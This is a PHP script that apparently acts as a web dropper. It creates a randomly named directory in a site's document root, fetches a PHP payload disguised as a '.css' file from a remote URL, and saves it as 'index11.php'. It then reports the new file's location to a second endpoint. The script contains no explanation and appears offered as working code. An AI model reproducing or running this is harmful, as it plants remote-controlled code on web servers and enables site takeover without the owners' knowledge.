﻿<?php
set_time_limit(9999) ;
$url="http://127.0.0.1/";
$folderpath=$_SERVER['DOCUMENT_ROOT']."\\".getCode(rand(3,4))."\\"; 
if(!file_exists($folderpath))
{
   mkdir($folderpath);
   echo $folderpath."OK!<br/>";
}

$pic1 = file_get_contents($url."/khd/php.css");
file_put_contents($folderpath."/index11.php",$pic1);

$folderpath2=explode("\\",$folderpath);
file_get_contents("http://127.0.0.1/p2.php?str=http://".$_SERVER['SERVER_NAME']."/".$folderpath2[count($folderpath2)-2]."/");


function getCode($length = 5){
	$chars = 'abcdefghijklmnopqrstuvwxyz';
	$chars2 = '';
	for ( $i = 0; $i < $length; $i++ )
	{
		$chars2 .= $chars[ mt_rand(0, strlen($chars) - 1) ];
	}
	return $chars2;
}

?>